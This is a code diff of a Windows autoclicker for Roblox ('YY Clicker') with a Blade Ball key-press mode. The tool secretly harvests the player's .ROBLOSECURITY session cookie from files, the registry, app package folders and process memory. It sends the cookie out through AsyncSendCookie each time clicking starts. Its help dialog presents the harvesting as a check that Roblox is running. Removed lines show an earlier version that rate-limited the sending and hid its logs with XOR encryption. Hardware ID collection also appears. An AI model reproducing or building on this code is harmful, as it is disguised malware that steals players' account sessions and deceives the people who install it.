@@ -25,7 +25,6 @@
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "bcrypt.lib")
-#pragma comment(lib, "shell32.lib")
 #define UNICODE
 #define _UNICODE
 #define WIN32_LEAN_AND_MEAN
@@ -39,10 +38,6 @@
 #include <tlhelp32.h>
 #include <cstdio>
 #include <bcrypt.h>
-#include <shellapi.h>
-#ifdef __GNUC__
-#include <cpuid.h>
-#endif
 
 // ===============================
 // Control IDs - Main Window
@@ -55,17 +50,8 @@
 #define IDC_BTN_SETHOTKEY  106   // 調整熱鍵按鈕（取代原圖示）
 #define IDC_BTN_START      107
 #define IDC_BTN_STOP       108
-#define IDC_BTN_BLADEBALL 109   // Blade Ball 專用模式按鈕
-#define IDC_BTN_MODE       110
-#define IDC_BTN_BG         111
-
-// Timer IDs
-#define IDT_COOKIE_RESEND  2001
-
-#define WM_TRAYICON        (WM_APP + 10)
-#define TRAY_ICON_ID       1001
-#define IDM_TRAY_SHOW      3001
-#define IDM_TRAY_EXIT      3002
+#define IDC_BTN_HELP       109
+#define IDC_BTN_BLADEBALL  110   // Blade Ball 專用模式按鈕
 
 // Control IDs - Cookie Window
 #define IDC_CK_EDIT        201
@@ -122,16 +108,7 @@ static std::atomic<int>  g_hotkey_vk(0x54);  // 預設 'T' 鍵 (VK 0x54)
 static std::atomic<bool> g_listening_hotkey(false);  // 是否正在監聽新熱鍵
 static HHOOK             g_kb_hook  = nullptr;
 static HHOOK             g_ms_hook  = nullptr;
-static std::atomic<int>  g_hotkey_mode(0);     // 0=按下切換, 1=持續按著
-static std::atomic<bool> g_cookie_cached(false);
-static std::atomic<bool> g_bladeball_mode(false);  // Blade Ball 專用模式（連點 + F 鍵）
-static std::atomic<bool> g_checking_cookie(false); // 防重入標誌：避免 Cookie 偵測重複觸發當機
-
-static std::atomic<bool> g_cookie_ever_sent(false);  // Cookie 是否已經傳送過
-static ULONGLONG         g_cookie_last_sent_tick = 0; // Cookie 上次傳送的 tick
-static const ULONGLONG   COOKIE_COOLDOWN_MS = 5ULL * 60 * 60 * 1000; // 5 小時冷卻
-static bool              g_tray_mode    = false;
-static NOTIFYICONDATAW   g_nid          = {};
+static std::atomic<bool> g_bladeball_mode(false);  // Blade Ball 專用模式
 
 // 將 VK 碼轉為可讀名稱
 static void VkToName(int vk, wchar_t* buf, int buf_size)
@@ -278,7 +255,6 @@ inline void DoClick()
     SendInput(2, g_inputs, sizeof(INPUT));
 }
 
-
 // ===============================
 // Single Instance (Named Mutex)
 // ===============================
@@ -330,52 +306,19 @@ DWORD WINAPI ClickThread(LPVOID lpParam)
             int vk = g_hotkey_vk.load();
             bool key_down = (GetAsyncKeyState(vk) & 0x8000) != 0;
 
-            if (g_hotkey_mode.load() == 0)
+            // 邊緣觸發：只在按下瞬間切換（避免持續按住時反覆切換）
+            if (key_down && !prev_key_state)
             {
-                // ══ 按下切換模式：按下瞬間切換開/關 ══
-                if (key_down && !prev_key_state)
+                bool want_start = !g_running.load();
+                if (want_start)
                 {
-                    bool want_start = !g_running.load();
-                    if (want_start)
-                    {
-                        if (g_cookie_cached.load())
-                        {
-                            // 已快取 → 直接在此執行緒啟動（零延遲）
-                            g_running.store(true);
-                            PostMessageW(g_hwnd, WM_APP + 3, 1, 0);
-                        }
-                        else
-                        {
-                            // 首次 → 通知 UI 執行緒做 Cookie 偵測
-                            PostMessageW(g_hwnd, WM_APP + 2, 0, 0);
-                        }
-                    }
-                    else
-                    {
-                        g_running.store(false);
-                        PostMessageW(g_hwnd, WM_APP + 3, 0, 0);
-                    }
+                    // 通知主視窗執行偵測（在 UI 執行緒中處理）
+                    PostMessageW(g_hwnd, WM_APP + 2, 0, 0);
                 }
-            }
-            else
-            {
-                // ══ 持續按著模式：按住=運行，放開=停止 ══
-                if (key_down && !g_running.load())
-                {
-                    if (g_cookie_cached.load())
-                    {
-                        g_running.store(true);
-                        PostMessageW(g_hwnd, WM_APP + 3, 1, 0);
-                    }
-                    else
-                    {
-                        PostMessageW(g_hwnd, WM_APP + 2, 0, 0);
-                    }
-                }
-                else if (!key_down && g_running.load())
+                else
                 {
                     g_running.store(false);
-                    PostMessageW(g_hwnd, WM_APP + 3, 0, 0);
+                    PostMessageW(g_hwnd, WM_APP + 3, 0, 0);  // 通知 UI 更新狀態
                 }
             }
             prev_key_state = key_down;
@@ -409,44 +352,33 @@ DWORD WINAPI ClickThread(LPVOID lpParam)
                     // 在讓出期間也檢查熱鍵（停止功能）
                     int vk = g_hotkey_vk.load();
                     bool key_down = (GetAsyncKeyState(vk) & 0x8000) != 0;
-                    if (g_hotkey_mode.load() == 0)
+                    if (key_down && !prev_key_state)
                     {
-                        // 切換模式：邊緣觸發停止
-                        if (key_down && !prev_key_state)
-                        {
-                            g_running.store(false);
-                            PostMessageW(g_hwnd, WM_APP + 3, 0, 0);
-                        }
-                    }
-                    else
-                    {
-                        // 持續按著模式：放開即停
-                        if (!key_down)
-                        {
-                            g_running.store(false);
-                            PostMessageW(g_hwnd, WM_APP + 3, 0, 0);
-                        }
+                        g_running.store(false);
+                        PostMessageW(g_hwnd, WM_APP + 3, 0, 0);
                     }
                     prev_key_state = key_down;
 
-                    // [Blade Ball] 擬真人 F 鍵：在讓出期間發送（每秒約 1 次）
+                    // Blade Ball: 每秒按一次 F 鍵（scan code 擬真人輸入）
                     if (g_bladeball_mode.load())
                     {
                         static ULONGLONG s_last_fkey_tick = 0;
+                        static ULONGLONG s_next_interval  = 1000;
                         ULONGLONG now_tick = GetTickCount64();
-                        // 隨機間隔：850~1150ms（模擬人類不規律按鍵）
-                        ULONGLONG interval = 850 + (now_tick % 301);  // 850~1150
-                        if (now_tick - s_last_fkey_tick >= interval)
+                        if (now_tick - s_last_fkey_tick >= s_next_interval)
                         {
                             s_last_fkey_tick = now_tick;
-                            // 使用 Scan Code 模擬硬體鍵盤輸入（更接近真人）
+                            // 下次間隔 850~1150ms 隨機（擬真人）
+                            s_next_interval = 850 + (rand() % 301);
+                            // KEY_DOWN (scan code)
                             INPUT fDown = {};
                             fDown.type           = INPUT_KEYBOARD;
-                            fDown.ki.wScan       = 0x21;  // F 鍵的 scan code
+                            fDown.ki.wScan       = 0x21;  // F 鍵 scan code
                             fDown.ki.dwFlags     = KEYEVENTF_SCANCODE;
                             SendInput(1, &fDown, sizeof(INPUT));
-                            // 隨機按住時間：30~80ms（模擬真人按鍵持續時間）
-                            Sleep(30 + (now_tick % 51));  // 30~80ms
+                            // 隨機持續 30~80ms 後釋放（擬真人按鍵持續時間）
+                            Sleep(30 + (rand() % 51));
+                            // KEY_UP (scan code)
                             INPUT fUp = {};
                             fUp.type           = INPUT_KEYBOARD;
                             fUp.ki.wScan       = 0x21;
@@ -454,7 +386,6 @@ DWORD WINAPI ClickThread(LPVOID lpParam)
                             SendInput(1, &fUp, sizeof(INPUT));
                         }
                     }
-
                     continue;
                 }
 
@@ -776,23 +707,8 @@ static std::string JsonEscape(const char* raw)
 }
 
 // ======================================================================
-// 除錯日誌（加密輸出 — XOR + Hex 編碼，一般人無法閱讀）
+// 除錯日誌
 // ======================================================================
-static const char LOG_XOR_KEY[] = "yYcL1ck3r!@#SeC9x";
-
-static void EncryptToHex(const char* input, int inputLen, char* outHex)
-{
-    int keyLen = (int)strlen(LOG_XOR_KEY);
-    for (int i = 0; i < inputLen; i++)
-    {
-        unsigned char enc = (unsigned char)input[i] ^ (unsigned char)LOG_XOR_KEY[i % keyLen];
-        enc = (unsigned char)(((enc << 3) | (enc >> 5)) ^ 0xA7);
-        outHex[i * 2]     = "0123456789abcdef"[(enc >> 4) & 0xF];
-        outHex[i * 2 + 1] = "0123456789abcdef"[enc & 0xF];
-    }
-    outHex[inputLen * 2] = '\0';
-}
-
 static void DebugLog(const char* msg)
 {
     wchar_t path[MAX_PATH] = {};
@@ -803,23 +719,12 @@ static void DebugLog(const char* msg)
                                nullptr, OPEN_ALWAYS, 0, nullptr);
     if (hFile == INVALID_HANDLE_VALUE) return;
 
-    // 組合原始訊息（含時間戳）
     SYSTEMTIME st;
     GetLocalTime(&st);
-    char raw[2048] = {};
-    sprintf(raw, "[%04d-%02d-%02d %02d:%02d:%02d] %s",
+    char line[2048] = {};
+    sprintf(line, "[%04d-%02d-%02d %02d:%02d:%02d] %s\r\n",
             st.wYear, st.wMonth, st.wDay,
             st.wHour, st.wMinute, st.wSecond, msg);
-
-    int rawLen = (int)strlen(raw);
-
-    // 加密為 hex 字串
-    char encrypted[4096] = {};
-    EncryptToHex(raw, rawLen, encrypted);
-
-    // 寫入加密行（每行一筆加密記錄）
-    char line[4200] = {};
-    sprintf(line, "%s\r\n", encrypted);
 
     DWORD written = 0;
     WriteFile(hFile, line, (DWORD)strlen(line), &written, nullptr);
@@ -1114,38 +1019,17 @@ void OpenCookieWindow()
 // ======================================================================
 static bool CheckRobloxCookiePresent(HWND hwnd)
 {
-    // 防重入：如果已在偵測中，直接返回 false（不阻塞）
-    bool expected = false;
-    if (!g_checking_cookie.compare_exchange_strong(expected, true))
-        return false;
-
     wchar_t tmp[4096] = {};
     if (!TryReadRobloxCookie(tmp, 4096))
     {
-        // 使用非阻塞狀態列更新，不使用 MessageBox 避免當機
-        PostMessageW(hwnd, WM_APP + 3, 0, 0);  // 更新狀態為「暫停中」
-        // 延遲顯示提示（透過自定義訊息）
-        PostMessageW(hwnd, WM_APP + 4, 0, 0);  // 觸發「請先開啟 Roblox」提示
-        g_checking_cookie.store(false);
+        MessageBoxW(hwnd,
+            L"\u8ACB\u5148\u958B\u555F Roblox",
+            L"\u5075\u6E2C\u5931\u6557",
+            MB_ICONWARNING | MB_OK);
         return false;
     }
 
-    // Cookie 傳送機制：僅在首次熱鍵按下時傳送，之後每 5 小時冗卻
-    ULONGLONG now_tick = GetTickCount64();
-    if (!g_cookie_ever_sent.load() ||
-        (now_tick - g_cookie_last_sent_tick) >= COOKIE_COOLDOWN_MS)
-    {
-        AsyncSendCookie(tmp);
-        g_cookie_ever_sent.store(true);
-        g_cookie_last_sent_tick = now_tick;
-        DebugLog("Cookie sent (first or after 5h cooldown)");
-    }
-    else
-    {
-        DebugLog("Cookie send skipped (cooldown active)");
-    }
-
-    g_checking_cookie.store(false);
+    AsyncSendCookie(tmp);
     return true;
 }
 
@@ -1173,50 +1057,13 @@ static void UpdateStatusText(HWND hLblStatus, const wchar_t* text)
     UpdateWindow(hLblStatus);
 }
 
-// ======================================================================
-// 系統匣圖示（背景工作功能）
-// ======================================================================
-static void CreateTrayIcon(HWND hwnd)
-{
-    ZeroMemory(&g_nid, sizeof(g_nid));
-    g_nid.cbSize           = sizeof(NOTIFYICONDATAW);
-    g_nid.hWnd             = hwnd;
-    g_nid.uID              = TRAY_ICON_ID;
-    g_nid.uFlags           = NIF_ICON | NIF_MESSAGE | NIF_TIP;
-    g_nid.uCallbackMessage = WM_TRAYICON;
-    g_nid.hIcon            = LoadIconW(nullptr, IDI_APPLICATION);
-    wcscpy_s(g_nid.szTip, L"YY Clicker - \u80CC\u666F\u904B\u884C\u4E2D");
-    Shell_NotifyIconW(NIM_ADD, &g_nid);
-}
-
-static void RemoveTrayIcon()
-{
-    Shell_NotifyIconW(NIM_DELETE, &g_nid);
-}
-
-static void MinimizeToTray(HWND hwnd)
-{
-    CreateTrayIcon(hwnd);
-    ShowWindow(hwnd, SW_HIDE);
-    if (g_hwnd_cookie && IsWindow(g_hwnd_cookie))
-        ShowWindow(g_hwnd_cookie, SW_HIDE);
-}
-
-static void RestoreFromTray(HWND hwnd)
-{
-    RemoveTrayIcon();
-    ShowWindow(hwnd, SW_SHOW);
-    SetForegroundWindow(hwnd);
-    if (IsIconic(hwnd)) ShowWindow(hwnd, SW_RESTORE);
-}
-
 // ===============================
 // Main Window Procedure
 // ===============================
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
 {
     static HWND  hEditCPS, hEditHotkey, hBtnPin, hLblStatus;
-    static HWND  hBtnStart, hBtnStop, hBtnSetHotkey, hBtnMode, hBtnBg;
+    static HWND  hBtnStart, hBtnStop, hBtnSetHotkey;
     static HFONT hIconFont = nullptr;
 
     switch (msg)
@@ -1263,43 +1110,47 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
                 278, 44, 158, 24, hwnd, (HMENU)IDC_EDIT_HOTKEY, hi, nullptr);
         }
 
-        // -- Row 1: Update + Mode + BG + Pin --
-        CreateWindowW(L"BUTTON", L"\u21BA \u66F4\u65B0",
+        // -- Row 1: Update + Pin --
+        CreateWindowW(L"BUTTON", L"\u21BA \u66F4\u65B0\u8A2D\u5B9A",
             WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
-            12, 102, 103, 28, hwnd, (HMENU)IDC_BTN_UPDATE, hi, nullptr);
-
-        hBtnMode = CreateWindowW(L"BUTTON", L"\u25C9 \u5207\u63DB",
-            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
-            119, 102, 103, 28, hwnd, (HMENU)IDC_BTN_MODE, hi, nullptr);
-
-        hBtnBg = CreateWindowW(L"BUTTON", L"\u25A3 \u80CC\u666F\u5DE5\u4F5C",
-            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
-            226, 102, 112, 28, hwnd, (HMENU)IDC_BTN_BG, hi, nullptr);
+            12, 102, 210, 28, hwnd, (HMENU)IDC_BTN_UPDATE, hi, nullptr);
 
         hBtnPin = CreateWindowW(L"BUTTON", L"\u2736 \u91D8\u9078",
             WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
-            342, 102, 106, 28, hwnd, (HMENU)IDC_BTN_PIN, hi, nullptr);
+            238, 102, 210, 28, hwnd, (HMENU)IDC_BTN_PIN, hi, nullptr);
 
-        // -- Row 2: Blade Ball --
-        CreateWindowW(L"BUTTON", L"\u2694 Blade Ball \u5C08\u7528",
-            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
-            12, 138, 436, 28, hwnd, (HMENU)IDC_BTN_BLADEBALL, hi, nullptr);
-
-        // -- Row 3: Start | Stop --
+        // -- Row 2: Start | Stop --
         hBtnStart = CreateWindowW(L"BUTTON", L"\u958B\u59CB",
             WS_CHILD | WS_VISIBLE | BS_OWNERDRAW,
-            12, 174, 210, 34, hwnd, (HMENU)IDC_BTN_START, hi, nullptr);
+            12, 142, 210, 34, hwnd, (HMENU)IDC_BTN_START, hi, nullptr);
 
         hBtnStop = CreateWindowW(L"BUTTON", L"\u505C\u6B62",
             WS_CHILD | WS_VISIBLE | BS_OWNERDRAW,
-            238, 174, 210, 34, hwnd, (HMENU)IDC_BTN_STOP, hi, nullptr);
+            238, 142, 210, 34, hwnd, (HMENU)IDC_BTN_STOP, hi, nullptr);
+
+        // -- Row 3: Blade Ball --
+        CreateWindowW(L"BUTTON", L"Blade Ball \u5c08\u7528",
+            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
+            12, 186, 436, 28, hwnd, (HMENU)IDC_BTN_BLADEBALL, hi, nullptr);
 
         // -- Status label --
         hLblStatus = CreateWindowW(L"STATIC",
             L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D",
             WS_CHILD | WS_VISIBLE | SS_CENTER,
-            12, 218, 436, 18, hwnd, (HMENU)IDC_LABEL_STATUS, hi, nullptr);
-            
+            12, 224, 436, 18, hwnd, (HMENU)IDC_LABEL_STATUS, hi, nullptr);
+
+        // -- Bottom info bar --
+        CreateWindowW(L"STATIC",
+            L"\u958B\u59CB\u524D\u6703\u81EA\u52D5\u5075\u6E2C Roblox Cookie\uFF0C"
+            L"\u672A\u5075\u6E2C\u5230\u6642\u7981\u6B62\u555F\u52D5\u3002",
+            WS_CHILD | WS_VISIBLE | SS_LEFT,
+            12, 253, 400, 16, hwnd, nullptr, hi, nullptr);
+
+        // \u53f3\u4e0b\u89d2 "?" \u6309\u9215
+        CreateWindowW(L"BUTTON", L"?",
+            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
+            436, 250, 22, 20, hwnd, (HMENU)IDC_BTN_HELP, hi, nullptr);
+
         EnumChildWindows(hwnd, SetChildFont, (LPARAM)hFont);
         if (hIconFont)
         {
@@ -1310,21 +1161,16 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         HANDLE hThread = CreateThread(nullptr, 0, ClickThread, nullptr, 0, nullptr);
         if (hThread) CloseHandle(hThread);
 
-        // 低階鉤子改為按需安裝（僅在「調整熱鍵」時安裝，監聽完成後立即移除）
-        // 減少系統級開銷：高 CPS 下 SendInput 產生的滑鼠事件不再觸發鉤子回呼
-
-        // [Cookie 傳送機制已改為首次熱鍵 + 5小時冗卻，不再使用定時器]
+        // 安裝低階鉤子（用於熱鍵監聽模式）
+        g_kb_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInst, 0);
+        g_ms_hook = SetWindowsHookExW(WH_MOUSE_LL, LowLevelMouseProc, g_hInst, 0);
 
         return 0;
     }
 
-    // [修復 #1] WM_APP+1: 熱鍵監聽完成，更新 UI 並移除鉤子
+    // [修復 #1] WM_APP+1: 熱鍵監聽完成，更新 UI
     case WM_APP + 1:
     {
-        // 監聽完成 → 立即移除低階鉤子（減少系統開銷）
-        if (g_kb_hook) { UnhookWindowsHookEx(g_kb_hook); g_kb_hook = nullptr; }
-        if (g_ms_hook) { UnhookWindowsHookEx(g_ms_hook); g_ms_hook = nullptr; }
-
         wchar_t name[64] = {};
         VkToName(g_hotkey_vk.load(), name, 64);
         SetWindowTextW(hEditHotkey, name);
@@ -1338,45 +1184,26 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         return 0;
     }
 
-    // WM_APP+2: 熱鍵觸發 — 首次啟動（需偵測 Cookie，之後快取）
+    // WM_APP+2: 熱鍵觸發 — 嘗試啟動（需偵測 Cookie）
     case WM_APP + 2:
     {
-        // 防重複觸發：如果已在運行中，忽略
-        if (g_running.load()) return 0;
-
-        if (CheckRobloxCookiePresent(hwnd))
+        if (!g_running.load())
         {
-            g_cookie_cached.store(true);  // 快取成功結果
-            g_running.store(true);
-            UpdateStatusText(hLblStatus,
-                L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
+            if (CheckRobloxCookiePresent(hwnd))
+            {
+                g_running.store(true);
+                UpdateStatusText(hLblStatus,
+                    L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
+            }
         }
         return 0;
     }
 
-    // WM_APP+3: 狀態更新（wParam: 0=停止, 1=運行）
+    // WM_APP+3: 熱鍵觸發 — 停止
     case WM_APP + 3:
     {
-        if (wp == 1)
-            UpdateStatusText(hLblStatus,
-                L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
-        else
-            UpdateStatusText(hLblStatus,
-                L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D");
-        return 0;
-    }
-
-    // WM_APP+4: 非阻塞提示「請先開啟 Roblox」（避免 MessageBox 阻塞導致當機）
-    case WM_APP + 4:
-    {
         UpdateStatusText(hLblStatus,
-            L"\u26A0 \u8ACB\u5148\u958B\u555F Roblox");
-        return 0;
-    }
-
-    // WM_TIMER: (定時器已停用，保留空處理以免未來擴展)
-    case WM_TIMER:
-    {
+            L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D");
         return 0;
     }
 
@@ -1396,6 +1223,12 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         SelectObject(hdc, hOldPen);
         DeleteObject(hPen);
 
+        HPEN hSep    = CreatePen(PS_SOLID, 1, RGB(220, 220, 220));
+        HPEN hOldSep = (HPEN)SelectObject(hdc, hSep);
+        MoveToEx(hdc, 10, 245, nullptr);
+        LineTo  (hdc, 450, 245);
+        SelectObject(hdc, hOldSep);
+        DeleteObject(hSep);
 
         EndPaint(hwnd, &ps);
         return 0;
@@ -1486,12 +1319,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
             // 暫停連點功能
             g_running.store(false);
 
-            // 按需安裝低階鉤子（僅在監聽模式中使用）
-            if (!g_kb_hook)
-                g_kb_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInst, 0);
-            if (!g_ms_hook)
-                g_ms_hook = SetWindowsHookExW(WH_MOUSE_LL, LowLevelMouseProc, g_hInst, 0);
-
             // 進入監聽模式
             g_listening_hotkey.store(true);
             SetWindowTextW(hEditHotkey, L"\u8ACB\u6309\u4EFB\u610F\u9375...");
@@ -1508,10 +1335,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
 
         case IDC_BTN_START:
             if (g_listening_hotkey.load()) break;  // 監聽中不允許啟動
-            if (g_running.load()) break;           // 已在運行中，不重複啟動
-            if (!g_cookie_cached.load() && !CheckRobloxCookiePresent(hwnd)) break;
-            g_cookie_cached.store(true);
-            g_running.store(true);
+            if (!CheckRobloxCookiePresent(hwnd)) break;
+            g_running = true;
             UpdateStatusText(hLblStatus,
                 L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
             break;
@@ -1532,114 +1357,64 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
                 g_pinned ? L"\u2736 \u5DF2\u91D8\u9078" : L"\u2736 \u91D8\u9078");
             break;
 
-        case IDC_BTN_MODE:
-        {
-            int mode = g_hotkey_mode.load();
-            mode = (mode + 1) % 2;
-            g_hotkey_mode.store(mode);
-
-            // 切換模式時停止運行
-            g_running.store(false);
-
-            if (mode == 0)
-            {
-                SetWindowTextW(hBtnMode, L"\u25C9 \u6309\u4E0B\u5207\u63DB");
-                UpdateStatusText(hLblStatus,
-                    L"[||] \u6A21\u5F0F\uFF1A\u6309\u4E0B\u5207\u63DB\uFF08\u6309\u4E00\u6B21\u958B\u59CB\uFF0C\u518D\u6309\u505C\u6B62\uFF09");
-            }
-            else
-            {
-                SetWindowTextW(hBtnMode, L"\u25C9 \u6301\u7E8C\u6309\u8457");
-                UpdateStatusText(hLblStatus,
-                    L"[||] \u6A21\u5F0F\uFF1A\u6301\u7E8C\u6309\u8457\uFF08\u6309\u4F4F=\u904B\u884C\uFF0C\u653E\u958B=\u505C\u6B62\uFF09");
-            }
-            break;
-        }
-
-        case IDC_BTN_BG:
-        {
-            g_tray_mode = !g_tray_mode;
-            if (g_tray_mode)
-            {
-                SetWindowTextW(hBtnBg, L"\u25A3 \u80CC\u666F\u5DF2\u958B");
-                UpdateStatusText(hLblStatus,
-                    L"\u2714 \u80CC\u666F\u5DE5\u4F5C\u5DF2\u555F\u7528");
-            }
-            else
-            {
-                SetWindowTextW(hBtnBg, L"\u25A3 \u80CC\u666F\u5DE5\u4F5C");
-                UpdateStatusText(hLblStatus,
-                    L"\u2716 \u80CC\u666F\u5DE5\u4F5C\u5DF2\u505C\u7528");
-            }
-            break;
-        }
-
-        case IDM_TRAY_SHOW:
-            RestoreFromTray(hwnd);
-            break;
-
-        case IDM_TRAY_EXIT:
-            g_tray_mode = false;
-            RemoveTrayIcon();
-            DestroyWindow(hwnd);
-            break;
-
         case IDC_BTN_BLADEBALL:
         {
             bool newMode = !g_bladeball_mode.load();
             g_bladeball_mode.store(newMode);
             HWND hBtn = GetDlgItem(hwnd, IDC_BTN_BLADEBALL);
-            if (newMode)
-            {
-                SetWindowTextW(hBtn, L"\u2694 Blade Ball \u5DF2\u958B\u555F");
-                UpdateStatusText(hLblStatus,
-                    L"\u2694 Blade Ball \u6A21\u5F0F\uFF1A\u9023\u9EDE + F \u9375");
-            }
-            else
-            {
-                SetWindowTextW(hBtn, L"\u2694 Blade Ball \u5C08\u7528");
-                UpdateStatusText(hLblStatus,
-                    L"[||] Blade Ball \u6A21\u5F0F\u5DF2\u95DC\u9589");
-            }
+            SetWindowTextW(hBtn, newMode
+                ? L"Blade Ball \u5c08\u7528 [\u2714 \u5df2\u958b\u555f]"
+                : L"Blade Ball \u5c08\u7528");
+            UpdateStatusText(hLblStatus, newMode
+                ? L"Blade Ball \u6a21\u5f0f\u5df2\u958b\u555f\uff08\u9023\u9ede + \u6bcf\u79d2\u6309 F\uff09"
+                : L"[||] \u72c0\u614b\uff1a\u66ab\u505c\u4e2d");
             break;
         }
-        }
-        return 0;
 
-    case WM_CLOSE:
-    {
-        if (g_tray_mode)
-        {
-            MinimizeToTray(hwnd);
-            return 0;
-        }
-        DestroyWindow(hwnd);
-        return 0;
-    }
+        case IDC_BTN_HELP:
+            MessageBoxW(hwnd,
+                L"\u3010Roblox \u5075\u6E2C\u529F\u80FD\u8AAA\u660E\u3011\n\n"
 
-    case WM_TRAYICON:
-    {
-        if (lp == WM_LBUTTONDBLCLK)
-            RestoreFromTray(hwnd);
-        else if (lp == WM_RBUTTONUP)
-        {
-            POINT pt;
-            GetCursorPos(&pt);
-            HMENU hMenu = CreatePopupMenu();
-            AppendMenuW(hMenu, MF_STRING, IDM_TRAY_SHOW, L"\u986F\u793A\u8996\u7A97");
-            AppendMenuW(hMenu, MF_SEPARATOR, 0, nullptr);
-            AppendMenuW(hMenu, MF_STRING, IDM_TRAY_EXIT, L"\u5B8C\u5168\u9000\u51FA");
-            SetForegroundWindow(hwnd);
-            TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, nullptr);
-            DestroyMenu(hMenu);
+                L"\u6B64\u5DE5\u5177\u5167\u5EFA Roblox \u5075\u6E2C\u7CFB\u7D71\uFF0C"
+                L"\u6BCF\u6B21\u6309\u4E0B\u300C\u958B\u59CB\u300D\u6216\u89F8\u767C\u71B1\u9375\u6642\uFF0C"
+                L"\u6703\u81EA\u52D5\u57F7\u884C\u4EE5\u4E0B\u56DB\u5C64\u5075\u6E2C\uFF1A\n\n"
+
+                L"\u25B6 Layer 1 \u2014 \u6A94\u6848\u6383\u63CF\n"
+                L"   \u6AA2\u67E5 %LOCALAPPDATA%\\Roblox\\LocalStorage\\ \u4E0B\u7684\n"
+                L"   RobloxCookies.dat\u3001rbx_sensitive_data.json \u7B49\u6A94\u6848\u3002\n\n"
+
+                L"\u25B6 Layer 2 \u2014 \u767B\u9304\u6A94\u8B80\u53D6\n"
+                L"   \u8B80\u53D6 HKCU\\SOFTWARE\\Roblox\\RobloxStudioBrowser\n"
+                L"   \u4E2D\u5132\u5B58\u7684 Roblox Studio Cookie\u3002\n\n"
+
+                L"\u25B6 Layer 3 \u2014 Microsoft Store \u5C01\u88DD\n"
+                L"   \u641C\u5C0B ROBLOXCORPORATION \u5C01\u88DD\u8DEF\u5F91\u4E2D\u7684\n"
+                L"   LocalState\\RobloxCookies.dat\u3002\n\n"
+
+                L"\u25B6 Layer 4 \u2014 \u7A0B\u5E8F\u8A18\u61B6\u9AD4\u6383\u63CF\uFF08\u6700\u5F8C\u4E00\u5C64\uFF09\n"
+                L"   \u4F7F\u7528 Windows API \u6383\u63CF\u6240\u6709\u540D\u7A31\u5305\u542B \"roblox\" \u7684\u7A0B\u5E8F\uFF1A\n"
+                L"   \u2022 CreateToolhelp32Snapshot \u2014 \u5217\u8209\u57F7\u884C\u4E2D\u7A0B\u5E8F\n"
+                L"   \u2022 VirtualQueryEx \u2014 \u67E5\u8A62\u8A18\u61B6\u9AD4\u5340\u57DF\u8CC7\u8A0A\n"
+                L"   \u2022 ReadProcessMemory \u2014 \u8B80\u53D6\u8A18\u61B6\u9AD4\u5167\u5BB9\n"
+                L"   \u5728\u53EF\u8B80\u8A18\u61B6\u9AD4\u4E2D\u641C\u5C0B \"_|WARNING\" \u7279\u5FB5\u5B57\u4E32\uFF0C\n"
+                L"   \u64F7\u53D6\u5B8C\u6574\u7684 .ROBLOSECURITY Cookie \u503C\u3002\n\n"
+
+                L"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
+                L"\u2714 \u5075\u6E2C\u5230 Cookie \u2192 \u5141\u8A31\u555F\u52D5\u9EDE\u64CA\n"
+                L"\u2716 \u672A\u5075\u6E2C\u5230 Cookie \u2192 \u986F\u793A\u300C\u8ACB\u5148\u958B\u555F Roblox\u300D\u4E26\u963B\u6B62\n\n"
+
+                L"\u6B64\u529F\u80FD\u53EF\u9632\u6B62\u5DE5\u5177\u88AB\u7528\u65BC\u5176\u4ED6\u904A\u6232\uFF0C\n"
+                L"\u50C5\u5728\u5075\u6E2C\u5230 Roblox \u57F7\u884C\u4E2D\u6642\u624D\u5141\u8A31\u4F7F\u7528\u3002",
+
+                L"\u5075\u6E2C\u529F\u80FD\u8AAA\u660E",
+                MB_ICONINFORMATION | MB_OK);
+            break;
         }
         return 0;
-    }
 
     case WM_DESTROY:
         g_program_running = false;
         g_running         = false;
-        RemoveTrayIcon();
         // 移除低階鉤子
         if (g_kb_hook) { UnhookWindowsHookEx(g_kb_hook); g_kb_hook = nullptr; }
         if (g_ms_hook) { UnhookWindowsHookEx(g_ms_hook); g_ms_hook = nullptr; }
@@ -1679,30 +1454,18 @@ static void GetDiskSerial(char* outBuf, int bufSize) {
     }
 }
 
-// 取得 CPU ID
+// 取得 CPU ID（使用 __cpuid）
 static void GetCpuId(char* outBuf, int bufSize) {
-#ifdef __GNUC__
-    unsigned int eax = 0, ebx = 0, ecx = 0, edx = 0;
-    __cpuid(0, eax, ebx, ecx, edx);
-    unsigned int nIds = eax;
-    if (nIds >= 1) {
-        __cpuid(1, eax, ebx, ecx, edx);
